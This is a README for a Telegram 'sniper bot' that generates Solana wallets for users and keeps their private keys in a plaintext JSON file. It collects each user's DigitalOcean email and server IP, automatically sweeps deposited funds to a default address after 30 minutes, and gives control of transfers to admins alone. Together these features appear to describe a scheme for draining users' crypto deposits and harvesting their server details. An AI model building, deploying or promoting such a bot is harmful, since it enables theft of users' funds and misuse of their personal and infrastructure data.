# 🦅 BirdEye Sniper Bot - Enhanced Solana Wallet Monitor

An advanced Telegram bot for monitoring Solana wallets with automatic balance detection, transaction notifications, and admin-controlled fund transfers.

## 🚀 Features

### � Wallet Monitoring
- **Real-time Balance Tracking**: Monitors Solana wallets every 30 seconds
- **Instant Notifications**: Get notified immediately when funds are received
- **Transaction Details**: Full transaction information with Helius API integration
- **USD Conversion**: All amounts displayed in both SOL and USD

### 🔄 Automated Fund Management
- **Auto-send**: Automatically sends funds to default address after 30 minutes
- **Manual Control**: Admin-only manual send with percentage or custom amounts
- **Smart Confirmations**: Multi-step confirmation process for security

### 👮‍♂️ Admin Controls
- **Admin-only Actions**: Only specified admins can control fund transfers
- **Group Notifications**: All activities posted to designated Telegram group
- **Flexible Amounts**: Send 25%, 50%, 75%, or custom amounts

## Tech Stack

- **Node.js** - Runtime environment
- **Telegraf.js** - Telegram bot framework
- **dotenv** - Environment variable management
- **validator** - Email and IP validation
- **pm2** - Process management
- **JSON** - User data storage

## Installation

1. **Clone and setup:**
```bash
cd /root/bird
npm install
```

2. **Configure environment:**
```bash
# Edit .env file with your bot token
nano .env
```

3. **Start with PM2:**
```bash
npm run pm2
```

## Bot Flow

### 1. Welcome Message
- Professional greeting with BirdEye branding
- 1-second delay for natural flow
- Setup button for new users

### 2. Setup Process
- **Step 1:** DigitalOcean email validation
- **Step 2:** IPv4 address verification  
- **Step 3:** Wallet generation with Solana keys

### 3. Data Storage
User data stored in `users.json`:
```json
{
  "123456789": {
    "email": "user@example.com",
    "ip": "1.2.3.4",
    "wallet_generated": true,
    "sol_address": "xxx",
    "private_key": "yyy"
  }
}
```

## PM2 Commands

```bash
# Start bot
npm run pm2

# Stop bot
npm run pm2:stop

# Restart bot
npm run pm2:restart

# View logs
npm run pm2:logs
```

## Environment Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `BOT_TOKEN` | Telegram Bot Token | `123456:ABC-DEF...` |
| `SOLANA_ADDRESS` | Wallet Address | `7xKXtg2CW87d97TX...` |
| `SOLANA_PRIVATE_KEY` | Private Key | `2b1e3f7c8d9a4b6e...` |
| `DATA_FILE` | JSON Storage File | `users.json` |

## Security Features

- Email format validation
- IPv4 address validation
- One-time key display
- Secure environment variable storage
- Error handling and logging

## Bot Commands

- `/start` - Initialize bot and show welcome
- **Inline Buttons:**
  - 🚀 Start Setup
  - 🎯 Generate Wallet
  - 🎯 Go to Menu

---

**Created for professional memecoin sniping operations** 🎯
